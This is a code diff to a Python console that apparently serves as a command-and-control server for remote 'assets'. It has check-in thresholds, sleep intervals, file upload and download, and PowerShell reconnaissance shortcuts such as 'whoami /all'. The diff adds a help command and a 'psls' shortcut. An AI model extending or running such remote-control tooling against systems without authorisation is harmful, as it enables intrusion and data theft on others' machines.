@@ -26,7 +26,7 @@ CHECK_IN_THRESHOLD = timedelta(minutes=10)  # Time threshold for check-in
 
 # Friendly command mappings
 command_mappings = {
-    "ls": "powershell ls",
+    "psls": "powershell ls",
     "ps": "powershell get-process",
     "pwd": "powershell pwd",
     "whoami": "whoami /all",
@@ -222,25 +222,33 @@ def upload_file(hostname, local_path, remote_path):
 def send_command_and_get_output(hostname):
     """Interactively send commands to a specific host and print the output."""
     global current_sleep_interval
-    print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' to return to the main menu.")
-    print("----------------")
-    print("Shortcut Commands")
-    print("  sleep <number>                      :: Set a custom timeout (ex. sleep 5)")
-    print("  download <file_path>                :: Download a file from the asset")
-    print("  upload <local_path> <remote_path>   :: Upload a file to the asset")
-    print("  psls                                :: List directory (powershell ls)")
-    print("  psps                                :: Retrieve the process list (powershell get-process)")
-    print("  ps grep <pattern>                   :: Filter processes by name")
-    print("  whoami                              :: List user details (whoami /all)")
-    print("  pspwd                               :: Current working directory (powershell pwd)")
-    print("  exit                                :: Return to main menu")
-    print("----------------")
+
+    print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' or 'help' for options.")
 
     while True:
         command_text = input("\nEnter a command to send: ").strip().lower()
+
+        # Help Command
+        if command_text == 'help':
+            print("\nAvailable Shortcut Commands:")
+            for shortcut, command in command_mappings.items():
+                print(f"  {shortcut:<10} :: {command}")
+            print("  sleep <number>         :: Set a custom timeout (ex. sleep 5)")
+            print("  download <file_path>    :: Download a file from the asset")
+            print("  upload <local_path> <remote_path> :: Upload a file to the asset")
+            print("  ps grep <pattern>       :: Filter processes by name")
+            print("  exit                   :: Return to main menu\n")
+            continue
+
         if command_text == 'exit':
             print("Returning to the main menu.")
             break
+
+        # Handle 'psls' with potential arguments
+        if command_text.startswith("psls "):
+            args = command_text[5:]  # Extract arguments after "psls "
+            command_text = f"powershell ls {args}"
+
 
         # Special handling for 'ps grep'
         if command_text.startswith('ps grep'):
@@ -288,7 +296,7 @@ def send_command_and_get_output(hostname):
         first_pass = True
         while True:
             if not first_pass:
-                for _ in range(10):  # Adjust number for less frequent updates
+                for _ in range(10):
                     print(next(spinner), end="\b", flush=True)
                     time.sleep(0.1)
             first_pass = False
